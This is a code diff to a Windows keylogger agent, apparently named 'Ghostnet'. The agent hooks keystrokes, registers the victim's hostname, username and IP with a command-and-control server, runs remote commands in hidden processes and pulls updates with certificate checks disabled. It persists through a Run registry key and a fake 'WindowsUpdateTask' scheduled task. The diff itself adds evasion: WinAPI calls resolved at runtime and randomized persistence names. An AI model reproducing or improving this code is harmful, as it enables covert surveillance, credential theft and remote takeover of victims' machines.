-        WinHttpCloseHandle(hSession);
+        pWinHttpCloseHandle(hConnect);
+        pWinHttpCloseHandle(hSession);
         return -1;
     }
 
@@ -967,22 +1254,22 @@ static int http_get(const char *path, char *response, int resp_size) {
         DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                           SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
+        pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                          &sec_flags, sizeof(sec_flags));
     }
 
-    BOOL ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+    BOOL ok = pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   NULL, 0, 0, 0);
-    if (ok) ok = WinHttpReceiveResponse(hRequest, NULL);
+    if (ok) ok = pWinHttpReceiveResponse(hRequest, NULL);
 
     if (ok && response && resp_size > 0) {
         DWORD avail, read;
         int total = 0;
         response[0] = '\0';
-        while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
+        while (pWinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
             DWORD to_read = avail;
             if (total + (int)to_read >= resp_size) to_read = resp_size - total - 1;
-            if (WinHttpReadData(hRequest, response + total, to_read, &read)) {
+            if (pWinHttpReadData(hRequest, response + total, to_read, &read)) {
                 total += read;
                 response[total] = '\0';
             } else {
@@ -991,9 +1278,9 @@ static int http_get(const char *path, char *response, int resp_size) {
         }
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    pWinHttpCloseHandle(hRequest);
+    pWinHttpCloseHandle(hConnect);
+    pWinHttpCloseHandle(hSession);
     return (ok && response) ? (int)strlen(response) : (ok ? 0 : -1);
 }
 
@@ -1018,7 +1305,7 @@ static void c2_register(void) {
     char os_ver[128];
     OSVERSIONINFOA ovi = {0};
     ovi.dwOSVersionInfoSize = sizeof(ovi);
-    char arch[8] = "x86";
+    char arch[8]; strcpy(arch, "x86");
 #ifdef _WIN64
     strcpy(arch, "x64");
 #endif
@@ -1030,24 +1317,20 @@ static void c2_register(void) {
     snprintf(os_ver, sizeof(os_ver), "Windows %s", arch);
 
     /* get local IP */
-    char local_ip[64] = "0.0.0.0";
+    char local_ip[64]; strcpy(local_ip, "0.0.0.0");
     char host_buf[NI_MAXHOST];
-    if (gethostname(host_buf, sizeof(host_buf)) == 0) {
-        struct hostent *he = gethostbyname(host_buf);
+    if (p_gethostname(host_buf, sizeof(host_buf)) == 0) {
+        struct hostent *he = p_gethostbyname(host_buf);
         if (he && he->h_addrtype == AF_INET) {
             struct in_addr addr;
             memcpy(&addr, he->h_addr_list[0], sizeof(addr));
-            strncpy(local_ip, inet_ntoa(addr), sizeof(local_ip) - 1);
+            strncpy(local_ip, p_inet_ntoa(addr), sizeof(local_ip) - 1);
         }
     }
 
     char body[2048];
     snprintf(body, sizeof(body),
-             "{\"hostname\":\"%s\","
-             "\"username\":\"%s\","
-             "\"os_version\":\"%s\","
-             "\"ip_address\":\"%s\","
-             "\"architecture\":\"%s\"}",
+             "{\"hostname\":\"%s\",\"username\":\"%s\",\"os_version\":\"%s\",\"ip_address\":\"%s\",\"architecture\":\"%s\"}",
              hostname, username, os_ver, local_ip, arch);
 
     char response[4096] = {0};
@@ -1135,12 +1418,8 @@ static void c2_heartbeat(void) {
 
     char body[1024];
     snprintf(body, sizeof(body),
-             "{\"agent_id\":\"%s\","
-             "\"version\":\"" AGENT_VERSION "\","
-             "\"keystrokes_since_last\":%ld,"
-             "\"uptime_seconds\":%lu,"
-             "\"status\":\"active\"}",
-             g_agent_id, keys, uptime);
+             "{\"agent_id\":\"%s\",\"version\":\"%s\",\"keystrokes_since_last\":%ld,\"uptime_seconds\":%lu,\"status\":\"active\"}",
+             g_agent_id, AGENT_VERSION, keys, uptime);
 
     char response[2048] = {0};
     int ret = http_post("/api/agents/heartbeat", body, response, sizeof(response));
@@ -1152,7 +1431,7 @@ static void c2_heartbeat(void) {
             if (stricmp_local(action, "uninstall") == 0) {
                 persistence_uninstall();
                 log_write("c2: uninstall — persistence removed, exiting");
-                PostQuitMessage(0);
+                pPostQuitMessage(0);
             } else if (stricmp_local(action, "update_config") == 0) {
                 /* config will be polled on next cycle */
                 log_write("c2: update_config command received");
@@ -1258,7 +1537,7 @@ static int c2_exec_command(const char *command_id, const char *command) {
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     HANDLE hStdoutRd, hStdoutWr;
 
-    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
+    if (!pCreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
         log_write("exec: CreatePipe failed");
         return -1;
     }
@@ -1271,7 +1550,7 @@ static int c2_exec_command(const char *command_id, const char *command) {
     si.wShowWindow = SW_HIDE;
 
     PROCESS_INFORMATION pi = {0};
-    BOOL created = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
+    BOOL created = pCreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     CloseHandle(hStdoutWr);
 
@@ -1363,13 +1642,13 @@ static int sha256_hex(const BYTE *data, DWORD len, char *hex_out, int hex_size) 
     DWORD hash_len = sizeof(hash);
     int ok = 0;
 
-    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
         goto done;
-    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
+    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
         goto done;
-    if (!CryptHashData(hHash, data, len, 0))
+    if (!pCryptHashData(hHash, data, len, 0))
         goto done;
-    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hash_len, 0))
+    if (!pCryptGetHashParam(hHash, HP_HASHVAL, hash, &hash_len, 0))
         goto done;
 
     for (int i = 0; i < 32 && hex_size > 2; i++) {
@@ -1379,8 +1658,8 @@ static int sha256_hex(const BYTE *data, DWORD len, char *hex_out, int hex_size) 
     ok = 1;
 
 done:
-    if (hHash) CryptDestroyHash(hHash);
-    if (hProv) CryptReleaseContext(hProv, 0);
+    if (hHash) pCryptDestroyHash(hHash);
+    if (hProv) pCryptReleaseContext(hProv, 0);
     return ok;
 }
 
@@ -1404,45 +1683,20 @@ static int write_updater_vbs(const char *vbs_path,
      *   - Launch target
      *   - Self-delete
      */
-    const char *script =
-        "On Error Resume Next\r\n"
-        "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
-        "Set shell = CreateObject(\"WScript.Shell\")\r\n"
-        "target = \"";
+    const char *script = "On Error Resume Next\r\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\r\nSet shell = CreateObject(\"WScript.Shell\")\r\ntarget = \"";
 
     DWORD written;
     WriteFile(hf, script, strlen(script), &written, NULL);
 
     WriteFile(hf, target_exe_path, strlen(target_exe_path), &written, NULL);
 
-    const char *mid =
-        "\"\r\n"
-        "newfile = \"";
+    const char *mid = "\"\r\nnewfile = \"";
     WriteFile(hf, mid, strlen(mid), &written, NULL);
 
     WriteFile(hf, new_exe_path, strlen(new_exe_path), &written, NULL);
 
     /* Chr(34) = double-quote — avoids VBS quote-counting nightmares */
-    const char *tail =
-        "\"\r\n"
-        "WScript.Sleep 500\r\n"
-        "copied = False\r\n"
-        "For i = 1 To 20\r\n"
-        "    If fso.FileExists(newfile) Then\r\n"
-        "        fso.CopyFile newfile, target, True\r\n"
-        "        If Err.Number = 0 Then\r\n"
-        "            copied = True\r\n"
-        "            Exit For\r\n"
-        "        End If\r\n"
-        "        Err.Clear\r\n"
-        "    End If\r\n"
-        "    WScript.Sleep 500\r\n"
-        "Next\r\n"
-        "If copied Then\r\n"
-        "    q = Chr(34)\r\n"
-        "    shell.Run q & target & q, 0, False\r\n"
-        "End If\r\n"
-        "fso.DeleteFile WScript.ScriptFullName, True\r\n";
+    const char *tail = "\"\r\nWScript.Sleep 500\r\ncopied = False\r\nFor i = 1 To 20\r\n    If fso.FileExists(newfile) Then\r\n        fso.CopyFile newfile, target, True\r\n        If Err.Number = 0 Then\r\n            copied = True\r\n            Exit For\r\n        End If\r\n        Err.Clear\r\n    End If\r\n    WScript.Sleep 500\r\nNext\r\nIf copied Then\r\n    q = Chr(34)\r\n    shell.Run q & target & q, 0, False\r\nEnd If\r\nfso.DeleteFile WScript.ScriptFullName, True\r\n";
 
     WriteFile(hf, tail, strlen(tail), &written, NULL);
     CloseHandle(hf);
@@ -1467,7 +1721,7 @@ static void c2_update(const char *url, const char *expected_sha256) {
     char host[MAX_HOST_LEN] = {0};
     int port = 443;
     int use_https = 1;
-    char uri_path[MAX_PATH_LEN] = "/";
+    char uri_path[MAX_PATH_LEN]; strcpy(uri_path, "/");
 
     const char *url_p = url;
     if (strncmp(url_p, "https://", 8) == 0) { url_p += 8; port = 443; use_https = 1; }
@@ -1487,37 +1741,37 @@ static void c2_update(const char *url, const char *expected_sha256) {
     MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, MAX_HOST_LEN);
     MultiByteToWideChar(CP_UTF8, 0, uri_path, -1, wpath, MAX_PATH_LEN);
 
-    HINTERNET hSession = WinHttpOpen(L"Ghostnet-Updater/1.0",
+    HINTERNET hSession = pWinHttpOpen(L"Ghostnet-Updater/1.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) goto fail;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, whost, (INTERNET_PORT)port, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); goto fail; }
+    HINTERNET hConnect = pWinHttpConnect(hSession, whost, (INTERNET_PORT)port, 0);
+    if (!hConnect) { pWinHttpCloseHandle(hSession); goto fail; }
 
     DWORD wflags = use_https ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", wpath, NULL,
+    HINTERNET hReq = pWinHttpOpenRequest(hConnect, L"GET", wpath, NULL,
         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, wflags);
-    if (!hReq) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); goto fail; }
+    if (!hReq) { pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); goto fail; }
 
     if (use_https) {
         DWORD sf = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sf, sizeof(sf));
+        pWinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sf, sizeof(sf));
     }
 
-    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0))
-        { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); goto fail; }
-    if (!WinHttpReceiveResponse(hReq, NULL))
-        { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); goto fail; }
+    if (!pWinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0))
+        { pWinHttpCloseHandle(hReq); pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); goto fail; }
+    if (!pWinHttpReceiveResponse(hReq, NULL))
+        { pWinHttpCloseHandle(hReq); pWinHttpCloseHandle(hConnect); pWinHttpCloseHandle(hSession); goto fail; }
 
     DWORD total = 0;
     DWORD avail, read;
-    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
+    while (pWinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
         DWORD to_read = avail;
         if (total + to_read > UPDATE_MAX_SIZE) to_read = UPDATE_MAX_SIZE - total;
-        if (!WinHttpReadData(hReq, payload + total, to_read, &read)) break;
+        if (!pWinHttpReadData(hReq, payload + total, to_read, &read)) break;
         total += read;
         if (total >= UPDATE_MAX_SIZE) break;
     }
@@ -1525,18 +1779,18 @@ static void c2_update(const char *url, const char *expected_sha256) {
     /* if we hit the size cap, check if more data remains — truncated */
     if (total >= UPDATE_MAX_SIZE) {
         DWORD extra;
-        if (WinHttpQueryDataAvailable(hReq, &extra) && extra > 0) {
-            WinHttpCloseHandle(hReq);
-            WinHttpCloseHandle(hConnect);
-            WinHttpCloseHandle(hSession);
+        if (pWinHttpQueryDataAvailable(hReq, &extra) && extra > 0) {
+            pWinHttpCloseHandle(hReq);
+            pWinHttpCloseHandle(hConnect);
+            pWinHttpCloseHandle(hSession);
             log_write("update: binary exceeds max size — discarding");
             goto fail;
         }
     }
 
-    WinHttpCloseHandle(hReq);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    pWinHttpCloseHandle(hReq);
+    pWinHttpCloseHandle(hConnect);
+    pWinHttpCloseHandle(hSession);
 
     if (total == 0) {
         log_write("update: download empty or failed");
@@ -1621,7 +1875,7 @@ static void c2_update(const char *url, const char *expected_sha256) {
         si.wShowWindow = SW_HIDE;
 
         PROCESS_INFORMATION pi = {0};
-        if (CreateProcessA(NULL, run_cmd, NULL, NULL, FALSE,
+        if (pCreateProcessA(NULL, run_cmd, NULL, NULL, FALSE,
                            CREATE_NO_WINDOW | DETACHED_PROCESS,
                            NULL, NULL, &si, &pi)) {
             CloseHandle(pi.hProcess);
@@ -1634,7 +1888,7 @@ static void c2_update(const char *url, const char *expected_sha256) {
 
     /* --- Step 7: flush buffer and exit --- */
     /* skip c2_exfil() — http_post may block long enough to race VBS timeout */
-    PostQuitMessage(0);
+    pPostQuitMessage(0);
     return;
 
 fail:
@@ -1657,8 +1911,8 @@ static void c2_config_poll(void) {
             if (val != g_exfil_interval_sec) {
                 g_exfil_interval_sec = val;
                 if (g_hwnd) {
-                    KillTimer(g_hwnd, TIMER_EXFIL);
-                    SetTimer(g_hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
+                    pKillTimer(g_hwnd, TIMER_EXFIL);
+                    pSetTimer(g_hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
                     log_write("c2: exfil timer re-armed");
                 }
             }
@@ -1667,8 +1921,8 @@ static void c2_config_poll(void) {
             if (val != g_heartbeat_interval_sec) {
                 g_heartbeat_interval_sec = val;
                 if (g_hwnd) {
-                    KillTimer(g_hwnd, TIMER_HEARTBEAT);
-                    SetTimer(g_hwnd, TIMER_HEARTBEAT, g_heartbeat_interval_sec * 1000, NULL);
+                    pKillTimer(g_hwnd, TIMER_HEARTBEAT);
+                    pSetTimer(g_hwnd, TIMER_HEARTBEAT, g_heartbeat_interval_sec * 1000, NULL);
                     log_write("c2: heartbeat timer re-armed");
                 }
             }
@@ -1717,7 +1971,7 @@ static void c2_config_poll(void) {
  * Returns 0 if another instance is running (exit).
  */
 static int mutex_acquire(void) {
-    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
+    HANDLE hMutex = CreateMutexW(NULL, TRUE, g_mutex_name);
     if (hMutex == NULL) return 0;
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         CloseHandle(hMutex);
@@ -1739,7 +1993,7 @@ static void persistence_paths(char *original_exe, int orig_size,
     char appdata[MAX_PATH];
     appdata[0] = '\0';
 
-    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
+    if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
         /* fallback: use %USERPROFILE% or C:\Users\Public */
         ExpandEnvironmentStringsA("%USERPROFILE%", appdata, MAX_PATH);
         if (appdata[0] == '\0') {
@@ -1757,7 +2011,7 @@ static void persistence_paths(char *original_exe, int orig_size,
 
 static int persistence_registry_install(const char *persist_exe) {
     HKEY hKey;
-    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
+    LONG result = pRegOpenKeyExA(HKEY_CURRENT_USER,
                                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
     if (result != ERROR_SUCCESS) return 0;
@@ -1766,27 +2020,27 @@ static int persistence_registry_install(const char *persist_exe) {
     char current_val[MAX_PATH] = {0};
     DWORD val_size = sizeof(current_val);
     DWORD val_type = 0;
-    result = RegQueryValueExA(hKey, REG_VALUE_NAME, NULL, &val_type,
+    result = pRegQueryValueExA(hKey, g_reg_value_name, NULL, &val_type,
                               (BYTE*)current_val, &val_size);
     if (result == ERROR_SUCCESS && val_type == REG_SZ &&
         strcmp(current_val, persist_exe) == 0) {
-        RegCloseKey(hKey);
+        pRegCloseKey(hKey);
         return 1;
     }
 
-    result = RegSetValueExA(hKey, REG_VALUE_NAME, 0, REG_SZ,
+    result = pRegSetValueExA(hKey, g_reg_value_name, 0, REG_SZ,
                             (BYTE*)persist_exe, strlen(persist_exe) + 1);
-    RegCloseKey(hKey);
+    pRegCloseKey(hKey);
     return (result == ERROR_SUCCESS) ? 1 : 0;
 }
 
 static void persistence_registry_remove(void) {
     HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+    if (pRegOpenKeyExA(HKEY_CURRENT_USER,
                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, REG_VALUE_NAME);
-        RegCloseKey(hKey);
+        pRegDeleteValueA(hKey, g_reg_value_name);
+        pRegCloseKey(hKey);
     }
 }
 
@@ -1799,13 +2053,13 @@ static int persistence_schtask_install(const char *persist_exe) {
      */
     char query_cmd[1024];
     snprintf(query_cmd, sizeof(query_cmd),
-             "schtasks /query /tn \"WindowsUpdateTask\" >nul 2>&1");
+             "schtasks /query /tn \"%s\" >nul 2>&1", g_task_name);
 
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     HANDLE hRead = NULL, hWrite = NULL;
     DWORD exit_code = 1;
 
-    if (CreatePipe(&hRead, &hWrite, &sa, 0)) {
+    if (pCreatePipe(&hRead, &hWrite, &sa, 0)) {
         STARTUPINFOA si = { sizeof(si) };
         si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
         si.hStdOutput = hWrite;
@@ -1816,7 +2070,7 @@ static int persistence_schtask_install(const char *persist_exe) {
         char cmdline[1024];
         snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", query_cmd);
 
-        if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
+        if (pCreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             WaitForSingleObject(pi.hProcess, 5000);
             GetExitCodeProcess(pi.hProcess, &exit_code);
@@ -1842,19 +2096,15 @@ static int persistence_schtask_install(const char *persist_exe) {
      */
     char create_cmd[2048];
     snprintf(create_cmd, sizeof(create_cmd),
-             "schtasks /create /tn \"WindowsUpdateTask\" "
-             "/tr \"\\\"%s\\\"\" "
-             "/sc ONLOGON "
-             "/delay 0001:00 "
-             "/f",
-             persist_exe);
+             "schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc ONLOGON /delay 0001:00 /f",
+             g_task_name, persist_exe);
 
     STARTUPINFOA si = { sizeof(si) };
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
     PROCESS_INFORMATION pi = {0};
-    if (CreateProcessA(NULL, create_cmd, NULL, NULL, FALSE,
+    if (pCreateProcessA(NULL, create_cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, 10000);
         DWORD code;
@@ -1879,7 +2129,7 @@ static void persistence_schtask_remove(void) {
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi = {0};
-    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
+    if (pCreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, 5000);
         CloseHandle(pi.hProcess);
@@ -2016,7 +2266,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         }
     }
 done:
-    return CallNextHookEx(g_hook, nCode, wParam, lParam);
+    return pCallNextHookEx(g_hook, nCode, wParam, lParam);
 }
 
 static int hook_install(void) {
@@ -2032,7 +2282,7 @@ static int hook_install(void) {
 
 static void hook_uninstall(void) {
     if (g_hook) {
-        UnhookWindowsHookEx(g_hook);
+        pUnhookWindowsHookEx(g_hook);
         g_hook = NULL;
         log_write("hook: uninstalled");
     }
@@ -2087,7 +2337,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                     if (dump_count > 0) {
                         char dump_path[MAX_PATH];
                         char appdata[MAX_PATH];
-                        if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
+                        if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
                             snprintf(dump_path, MAX_PATH,
                                      "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
                             HANDLE hf = CreateFileA(dump_path, GENERIC_WRITE, 0, NULL,
@@ -2130,7 +2380,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         case WM_DESTROY:
             /* flush pending keystrokes before exiting */
             if (g_agent_registered) c2_exfil();
-            PostQuitMessage(0);
+            pPostQuitMessage(0);
             return 0;
     }
     return DefWindowProc(hwnd, msg, wParam, lParam);
@@ -2142,9 +2392,9 @@ static HWND create_hidden_window(HINSTANCE hInstance) {
     wc.lpfnWndProc = WindowProc;
     wc.hInstance = hInstance;
     wc.lpszClassName = WINDOW_CLASS;
-    RegisterClassExW(&wc);
+    pRegisterClassExW(&wc);
 
-    return CreateWindowExW(0, WINDOW_CLASS, L"",
+    return pCreateWindowExW(0, WINDOW_CLASS, L"",
                            WS_OVERLAPPED, 0, 0, 0, 0,
                            HWND_MESSAGE, NULL, hInstance, NULL);
 }
@@ -2186,6 +2436,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     log_init();
     log_write("agent starting");
 
+    /* --- resolve all WinAPI functions + generate persistence IDs --- */
+    if (!api_init()) {
+        /* critical DLL missing — can't operate */
+        return 1;
+    }
+    gen_persistence_names();
+
     /* --- load configuration --- */
     char config_path[MAX_PATH];
     GetModuleFileNameA(NULL, config_path, MAX_PATH);
@@ -2213,7 +2470,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     {
         char dump_path[MAX_PATH];
         char appdata[MAX_PATH];
-        if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
+        if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
             snprintf(dump_path, MAX_PATH,
                      "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
             HANDLE hf = CreateFileA(dump_path, GENERIC_READ, FILE_SHARE_READ,
@@ -2265,16 +2522,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     g_hwnd = hwnd;
 
     /* set up periodic timers */
-    SetTimer(hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
-    SetTimer(hwnd, TIMER_HEARTBEAT, g_heartbeat_interval_sec * 1000, NULL);
-    SetTimer(hwnd, TIMER_CONFIG_POLL, g_config_poll_interval_sec * 1000, NULL);
-    SetTimer(hwnd, TIMER_REPAIR, REPAIR_INTERVAL_MS, NULL);
+    pSetTimer(hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
+    pSetTimer(hwnd, TIMER_HEARTBEAT, g_heartbeat_interval_sec * 1000, NULL);
+    pSetTimer(hwnd, TIMER_CONFIG_POLL, g_config_poll_interval_sec * 1000, NULL);
+    pSetTimer(hwnd, TIMER_REPAIR, REPAIR_INTERVAL_MS, NULL);
 
     /* hook + message window confirmed — safe to consume the shutdown dump */
     {
         char dump_path[MAX_PATH];
         char appdata[MAX_PATH];
-        if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
+        if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
             snprintf(dump_path, MAX_PATH,
                      "%s\\Microsoft\\Crypto\\shutdown.dump", appdata);
             DeleteFileA(dump_path);
@@ -2286,16 +2543,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     /* --- message loop (required for WH_KEYBOARD_LL) --- */
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
+        pTranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
     /* --- cleanup --- */
-    KillTimer(hwnd, TIMER_EXFIL);
-    KillTimer(hwnd, TIMER_HEARTBEAT);
-    KillTimer(hwnd, TIMER_CONFIG_POLL);
-    KillTimer(hwnd, TIMER_REPAIR);
-    DestroyWindow(hwnd);
+    pKillTimer(hwnd, TIMER_EXFIL);
+    pKillTimer(hwnd, TIMER_HEARTBEAT);
+    pKillTimer(hwnd, TIMER_CONFIG_POLL);
+    pKillTimer(hwnd, TIMER_REPAIR);
+    pDestroyWindow(hwnd);
     hook_uninstall();
     DeleteCriticalSection(&g_buffer_cs);
 
